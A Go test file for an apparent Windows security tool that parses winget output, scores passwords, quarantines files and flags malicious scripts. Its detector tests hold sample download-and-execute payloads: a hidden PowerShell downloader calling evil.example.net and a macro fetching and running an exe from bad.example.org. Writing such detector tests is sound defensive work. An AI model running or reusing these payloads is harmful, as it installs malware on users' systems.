package main

import (
	"archive/zip"
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const wingetES = "\r-\r\\\r|\r   \rNombre                          Id                         Versión        Disponible     Origen\r\n" +
	"------------------------------------------------------------------------------------------------------\r\n" +
	"Google Chrome                   Google.Chrome              130.0.6723.70  131.0.6778.86  winget\r\n" +
	"Mozilla Firefox (x64 es-ES)     Mozilla.Firefox.es-ES      132.0          133.0.3        winget\r\n" +
	"Notepad++ (64-bit x64)          Notepad++.Notepad++        8.6.9          8.7.1          winget\r\n" +
	"Microsoft Visual C++ 2015-2022… Microsoft.VCRedist.2015+.x64 14.38.33135.0 14.42.34433.0 winget\r\n" +
	"4 actualizaciones disponibles.\r\n"

func TestWingetTable(t *testing.T) {
	l := ParseWingetTable(wingetES)
	if len(l) != 4 {
		t.Fatalf("esperaba 4 paquetes, hay %d: %+v", len(l), l)
	}
	if l[0].ID != "Google.Chrome" || l[0].Version != "130.0.6723.70" || l[0].Available != "131.0.6778.86" || l[0].Source != "winget" {
		t.Errorf("chrome mal: %+v", l[0])
	}
	if l[2].Name != "Notepad++ (64-bit x64)" || l[2].ID != "Notepad++.Notepad++" {
		t.Errorf("notepad mal: %+v", l[2])
	}
	if l[3].ID != "Microsoft.VCRedist.2015+.x64" || l[3].Available != "14.42.34433.0" {
		t.Errorf("vcredist (fila desalineada) mal: %+v", l[3])
	}
}

func TestVersions(t *testing.T) {
	if CompareVersions("1.10", "1.9") != 1 || CompareVersions("2.0", "2.0.0") != 0 || CompareVersions("130.0.1", "131") != -1 {
		t.Error("comparación de versiones")
	}
}

func TestPSList(t *testing.T) {
	type X struct{ A int }
	if l := PSList[X](`{"A":1}`); len(l) != 1 || l[0].A != 1 {
		t.Error("objeto suelto")
	}
	if l := PSList[X](`[{"A":1},{"A":2}]`); len(l) != 2 {
		t.Error("lista")
	}
	if l := PSList[X](""); l != nil {
		t.Error("vacío")
	}
}

func TestScriptCombinations(t *testing.T) {
	bad := `$c=New-Object Net.WebClient; $c.DownloadFile('http://evil.example.net/a.exe',"$env:TEMP\a.exe"); Start-Process "$env:TEMP\a.exe" -WindowStyle Hidden`
	r := AnalyzeBytes("x.ps1", []byte(bad), int64(len(bad)))
	if r.Verdict != "Peligroso" {
		t.Errorf("descargador oculto debería ser Peligroso, es %s (%d)", r.Verdict, r.Score)
	}
	// Unos apuntes que HABLAN de malware no son peligrosos
	notes := "Apuntes: el ransomware usa vssadmin delete shadows y mimikatz roba lsass. Invoke-Expression es peligroso."
	r = AnalyzeBytes("apuntes.txt", []byte(notes), int64(len(notes)))
	if r.Score != 0 {
		t.Errorf("apuntes de texto no deberían puntuar: %d %+v", r.Score, r.Findings)
	}
	// Script de administración normal
	adm := "Get-Service | Where-Object Status -eq 'Stopped' | Start-Service\nRegister-ScheduledTask -TaskName Copia -Action $a"
	r = AnalyzeBytes("admin.ps1", []byte(adm), int64(len(adm)))
	if r.Verdict != "Sin señales de peligro" {
		t.Errorf("script de administración: %s %d", r.Verdict, r.Score)
	}
}

func TestDisguisedExe(t *testing.T) {
	pe := append([]byte("MZ"), make([]byte, 200)...)
	r := AnalyzeBytes("factura.pdf.exe", pe, int64(len(pe)))
	if r.Verdict == "Sin señales de peligro" {
		t.Errorf("doble extensión: %s", r.Verdict)
	}
	r = AnalyzeBytes("foto.jpg", pe, int64(len(pe)))
	if r.Verdict != "Sospechoso" && r.Verdict != "Peligroso" {
		t.Errorf("exe disfrazado de jpg: %s", r.Verdict)
	}
}

func TestMacroDoc(t *testing.T) {
	var buf bytes.Buffer
	z := zip.NewWriter(&buf)
	w, _ := z.Create("[Content_Types].xml")
	w.Write([]byte("<Types/>"))
	w, _ = z.Create("word/vbaProject.bin")
	w.Write([]byte("Sub AutoOpen()\x00 Set o = CreateObject(\"MSXML2.XMLHTTP\") \x00 o.Open \"GET\", \"http://bad.example.org/p.exe\" \x00 Shell \"cmd.exe /c p.exe\" End Sub"))
	z.Close()
	r := AnalyzeBytes("pedido.docm", buf.Bytes(), int64(buf.Len()))
	if r.Verdict != "Peligroso" {
		t.Errorf("macro descarga+ejecuta: %s %d %+v", r.Verdict, r.Score, r.Findings)
	}
}

func TestPassword(t *testing.T) {
	if s := PasswordStrength("123456"); s.Score > 0 {
		t.Errorf("123456 debería ser muy débil: %+v", s)
	}
	if s := PasswordStrength("Verano2024"); s.Score > 2 {
		t.Errorf("Verano2024: %+v", s)
	}
	if s := PasswordStrength("caballo-grapa-Bateria-correcta-71"); s.Score < 3 {
		t.Errorf("frase larga: %+v", s)
	}
	if n := pwnedCount("0018A45C4D1DEF81644B54AB7F969B88D65:1\r\n1E4C9B93F3F0682250B6CF8331B7EE68FD8:3861493\r\n", "1E4C9B93F3F0682250B6CF8331B7EE68FD8"); n != 3861493 {
		t.Errorf("pwnedCount %d", n)
	}
}

func TestXON(t *testing.T) {
	js := `{"ExposedBreaches":{"breaches_details":[{"breach":"Canva","domain":"canva.com","industry":"Information","password_risk":"hardtocrack","xposed_data":"Email addresses;Names;Passwords","xposed_date":"2019","xposed_records":137272116,"verified":"Yes"}]}}`
	o := parseXON([]byte(js))
	if len(o.Breaches) != 1 || !o.Breaches[0].Password || o.Breaches[0].Year != "2019" || o.Breaches[0].Data[0] != "Correos" {
		t.Errorf("%+v", o)
	}
}

func TestQuarantine(t *testing.T) {
	d := t.TempDir()
	st := NewStore(filepath.Join(d, "datos"))
	f := filepath.Join(d, "malo.exe")
	os.WriteFile(f, []byte("MZcontenido"), 0o644)
	if m := Quarantine(st, f, nil); m != "" {
		t.Fatal(m)
	}
	if _, err := os.Stat(f); err == nil {
		t.Fatal("el original sigue ahí")
	}
	l := QuarantineList(st)
	if len(l) != 1 {
		t.Fatal("índice")
	}
	raw, _ := os.ReadFile(filepath.Join(qDir(st), l[0].ID+".bsq"))
	if bytes.HasPrefix(raw, []byte("MZ")) {
		t.Fatal("no está transformado")
	}
	p := QuarantineRestore(st, l[0].ID)
	if b, _ := os.ReadFile(p); string(b) != "MZcontenido" {
		t.Fatalf("restaurado mal: %q", p)
	}
}

func TestEngineFlow(t *testing.T) {
	st := NewStore(t.TempDir())
	e := NewEngine(st)
	e.AddScanner(Scanner{Name: "prueba", Cats: []string{"Programas"}, Run: func(e *Engine) ([]*Item, error) {
		return []*Item{
			{ID: "w:A", Category: "Programas", Name: "App A", Status: "Actualizar", Action: "winget", Arg: "A.A", Current: "1", Available: "2"},
			{ID: "w:B", Category: "Programas", Name: "App B", Status: "Al día"},
		}, nil
	}})
	e.AddAction("winget", func(e *Engine, it *Item) (string, error) { return "Actualizado", nil })
	e.Scan(false)
	s := e.State(-1, 0)
	if len(s.Items) != 2 || s.Busy || s.Items[0].Name != "App A" {
		t.Fatalf("estado: %+v", s)
	}
	if Score(s.Items) != 97 {
		t.Errorf("puntuación %d", Score(s.Items))
	}
	e.Recommend("updates")
	if p := e.Plan([]string{"w:A", "w:B"}); p.Count != 1 {
		t.Errorf("plan %+v", p)
	}
	e.Run([]string{"w:A"})
	if it := e.find("w:A"); it.Status != "Actualizado" {
		t.Errorf("tras ejecutar: %s", it.Status)
	}
	// se guarda y se recupera en el siguiente arranque
	e2 := NewEngine(NewStore(st.Dir))
	if len(e2.Items()) != 2 {
		t.Error("no se recuperó el último análisis")
	}
	e2.Dismiss("w:B")
	if e2.DismissedCount() != 1 {
		t.Error("ocultar")
	}
}

func TestKEVMatch(t *testing.T) {
	now := time.Now().Format("2006-01-02")
	kev := []KEVEntry{{CVE: "CVE-1", Vendor: "Google", Product: "Chromium V8", Added: now}, {CVE: "CVE-2", Vendor: "Google", Product: "Chrome", Added: now}, {CVE: "CVE-3", Vendor: "7-Zip", Product: "7-Zip", Added: now}}
	if l := kevRecent("Google Chrome", kev, 60); len(l) != 1 || l[0].CVE != "CVE-2" {
		t.Errorf("chrome: %+v", l)
	}
	if l := kevRecent("7-Zip 24.08 (x64)", kev, 60); len(l) != 1 {
		t.Errorf("7zip: %+v", l)
	}
	if l := kevRecent("Notepad++", kev, 60); len(l) != 0 {
		t.Errorf("notepad: %+v", l)
	}
	_ = strings.ToLower
}
